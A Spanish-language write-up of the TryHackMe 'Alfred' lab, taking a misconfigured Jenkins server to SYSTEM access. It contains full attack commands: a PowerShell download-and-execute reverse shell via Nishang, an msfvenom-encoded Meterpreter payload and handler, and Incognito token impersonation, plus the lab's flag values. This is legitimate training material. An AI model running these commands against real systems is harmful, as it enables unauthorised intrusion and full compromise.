# 🧨 TryHackMe - Alfred (Writeup)

---

## 📌 Información General

| Campo                      | Valor                                        |
| -------------------------- | -------------------------------------------- |
| 🖥️ Máquina                | Alfred                                       |
| 🎯 Plataforma              | TryHackMe                                    |
| 📊 Nivel                   | Easy / Beginner                              |
| 🧠 Objetivo                | Explotación Jenkins + Privilege Escalation   |
| 🐧 Sistema atacante        | Kali Linux                                   |
| 🪟 Sistema víctima         | Windows Server                               |
| 🔐 Acceso inicial          | Jenkins misconfigurado                       |
| ⬆️ Escalada de privilegios | Token Impersonation (SeImpersonatePrivilege) |
| 🧰 Herramientas usadas     | nmap, netcat, msfvenom, metasploit, Nishang  |

---

# 🔍 Enumeración

## Escaneo de puertos

Dado que la máquina no responde a ICMP, utilizamos `-Pn`.

```bash
nmap -Pn -T4 -F -v 10.129.150.172
```

### 📄 Salida:

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-26 16:20 +0100
Initiating Parallel DNS resolution of 1 host. at 16:20
Completed Parallel DNS resolution of 1 host. at 16:20, 0.50s elapsed
Initiating SYN Stealth Scan at 16:20
Scanning 10.129.150.172 [100 ports]
Discovered open port 80/tcp on 10.129.150.172
Discovered open port 8080/tcp on 10.129.150.172
Discovered open port 3389/tcp on 10.129.150.172
Completed SYN Stealth Scan at 16:20, 2.53s elapsed (100 total ports)

PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy
```

### 📌 Conclusión

Se identifican **3 puertos abiertos**:

* 80 → Web
* 8080 → Jenkins
* 3389 → RDP

---

# 🌐 Enumeración Web

## Puerto 80

```bash
curl http://10.129.150.172
```

### 📄 Salida:

```
<html>
<head>
<style>
* {font-family: Arial;}
</style>
</head>
<body><center><br />
<img width="200" height+"300" src="bruce.jpg"><br /><br />
RIP Bruce Wayne<br /><br />
Donations to <strong>alfred@wayneenterprises.com</strong> are greatly appreciated.
</center></body>
</html>
```

### 🔍 Análisis

Se obtiene un correo:

```
alfred@wayneenterprises.com
```

Esto sugiere:

* Usuario: `alfred`
* Posible password reutilizada

---

# 🔐 Acceso a Jenkins

Accedemos a:

```
http://10.129.150.172:8080
```

### Credenciales válidas:

```
alfred:alfred@wayneenterprises.com
```

---

# 💻 Ejecución remota de comandos (RCE)

Se crea un **Freestyle Project** en Jenkins y se añade:

```
```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.130.29:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.130.29 -Port 4444
```

---

# 🧨 Reverse Shell (Nishang)

## Preparación

```bash
git clone https://github.com/samratashok/nishang.git
cd nishang/Shells
python3 -m http.server 8000
```

Listener:

```bash
nc -lvnp 4444
```

---

## Payload ejecutado en Jenkins

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.130.29:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.130.29 -Port 4444
```

---

## Resultado

Se obtiene shell:

```
connection received from 10.129.150.172
```

---

# 👤 User Flag

```powershell
cd C:\Users\bruce\Desktop
type user.txt
```

### 📄 Salida:

```
79007a09481963edf2e1321abd9ae2a0
```

---

# 💣 Meterpreter

## Generación payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=192.168.130.29 LPORT=4445 -f exe -o shell.exe
```

### 📄 Salida:

```
Payload size: 381 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

---

## Transferencia

```powershell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.130.29:8000/shell.exe','shell.exe')"
```

---

## Metasploit

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.130.29
set LPORT 4445
run
```

---

## Ejecución

```powershell
Start-Process shell.exe
```

---

## Resultado

```
Meterpreter session 1 opened
meterpreter >
```

---

# 🔐 Privilege Escalation

## Enumeración de privilegios

```powershell
whoami /priv
```

### 📄 Salida relevante:

```
SeDebugPrivilege                Enabled
SeImpersonatePrivilege          Enabled
```

---

## Uso de Incognito

```bash
load incognito
list_tokens -g
```

### 📄 Tokens disponibles:

```
BUILTIN\Administrators
```

---

## Impersonación

```bash
impersonate_token "BUILTIN\\Administrators"
getuid
```

### 📄 Resultado:

```
Server username: NT AUTHORITY\SYSTEM
```

---

# 🔄 Migración de proceso

```bash
ps
```

Buscar:

```
services.exe
```

```bash
migrate <PID>
```

---

# 🏁 Root Flag

```bash
cd C:\Windows\System32\config
cat root.txt
```

### 📄 Salida:

```
dff0f748678f280250f25a45b8046b4a
```

---

# 🧠 Conclusiones

## 🔥 Vulnerabilidades explotadas

* Jenkins mal configurado
* Credenciales débiles
* Ejecución remota de comandos (RCE)
* SeImpersonatePrivilege (Token Impersonation)

---

## 🧰 Herramientas utilizadas

* nmap
* curl
* netcat
* msfvenom
* metasploit
* Nishang
* Jenkins

---

## 💡 Lecciones aprendidas

* Jenkins expuesto = riesgo crítico
* Reutilización de credenciales es peligrosa
* SeImpersonatePrivilege permite escalada a SYSTEM
* Meterpreter facilita post-explotación avanzada


